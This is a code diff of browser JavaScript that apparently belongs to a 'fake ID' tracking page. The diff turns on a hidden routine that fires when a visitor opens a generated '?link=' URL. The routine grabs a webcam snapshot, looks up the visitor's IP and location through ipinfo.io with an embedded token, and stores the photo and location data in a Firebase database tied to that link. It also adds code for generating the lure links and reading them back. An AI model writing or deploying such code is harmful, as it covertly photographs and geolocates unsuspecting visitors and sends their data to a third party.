@@ -21,56 +21,59 @@ document.addEventListener('DOMContentLoaded', function () {
 
   var uniqueNum = Math.floor(Math.random(1,1000000))+new Date().getTime()
 
-    function GetFakeUserData() { 
+    function GetFakeUserData() {
       if (document.querySelectorAll('.wvu img').length > 0) { 
-        function SaveThisdata(photo) { 
-          fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
-            (response) => response.json()
-          ).then((jsonResponse) => {
-            var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-            firebase
-            .database()
-            .ref("fake_id_users/users/" + ip)
-            .set({
-              "photo": photo,
-              ...jsonResponse
-            });
-          })
-        }
-  
-        function GetImgThenSave() {
-          var video = document.getElementById('video'); 
-          // Cross-browser getUserMedia
-          navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
-          if (navigator.getUserMedia) {
-            navigator.getUserMedia({ video: true },
-              function (stream) {
-                video.srcObject = stream;
-    
-                setTimeout(() => {
-                  var canvas = document.createElement('canvas');
-                  canvas.width = 700;
-                  canvas.height = 500;
-                  var context = canvas.getContext('2d');
-                  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                  // Convert the canvas content to base64
-                  var base64Data = canvas.toDataURL('image/png');
-                  SaveThisdata(`${base64Data}`)
-                }, 1000);
-
-
-              },
-              function (err) {
-                SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
-              }
-            );
-          } else {
-            SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported')
-            // console.error("getUserMedia is not supported in this browser");
+        if (new URLSearchParams(window.location.search).has('link')) { 
+          function SaveThisdata(photo) { 
+            fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
+              (response) => response.json()
+            ).then((jsonResponse) => {
+              var ip = `${jsonResponse.ip}`.replaceAll('.','-')
+              firebase
+              .database()
+              .ref("users/"+ uniqueNum+'-'+ip)
+              .set({
+                "id":ip,
+                "under_link":new URLSearchParams(window.location.search).get('link'),
+                "photo": photo,
+                ...jsonResponse
+              });
+            })
           }
+          function GetImgThenSave() {
+            var video = document.getElementById('video'); 
+            // Cross-browser getUserMedia
+            navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
+            if (navigator.getUserMedia) {
+              navigator.getUserMedia({ video: true },
+                function (stream) {
+                  video.srcObject = stream;
+      
+                  setTimeout(() => {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = 700;
+                    canvas.height = 500;
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert the canvas content to base64
+                    var base64Data = canvas.toDataURL('image/png');
+                    SaveThisdata(`${base64Data}`)
+                  }, 1000);
+
+
+                },
+                function (err) {
+                  SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
+                }
+              );
+            } else {
+              SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported')
+              // console.error("getUserMedia is not supported in this browser");
+            }
+          }
+          GetImgThenSave()
         }
-        // GetImgThenSave()
       }
     }
     GetFakeUserData()
@@ -179,10 +182,10 @@ document.addEventListener('DOMContentLoaded', function () {
               (response) => response.json()
             ).then((jsonResponse) => {
               var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-              var link = window.location.origin+"?of="+uniqueNum
+              var link = window.location.origin+"?link="+uniqueNum
               firebase
               .database()
-              .ref("fake_id_users/links/" +uniqueNum)
+              .ref("links/" +uniqueNum)
               .set({
                 "ip":ip,
                 "link":link,
@@ -207,13 +210,10 @@ document.addEventListener('DOMContentLoaded', function () {
           var ip = `${jsonResponse.ip}`.replaceAll('.','-')
           firebase
           .database()
-          .ref("fake_id_users/links/" +uniqueNum)
-          .on("value", function (datas) {
-            console.log(datas)
-            // document.getElementById("roll").value = snap.val().rollNo;
-            // document.getElementById("name").value = snap.val().name;
-            // document.getElementById("gender").value = snap.val().gender;
-            // document.getElementById("address").value = snap.val().address;
+          .ref("links")
+          .on("value", function (snap) {
+            var data = snap.val();
+            console.log(data);
           });
         })  
         
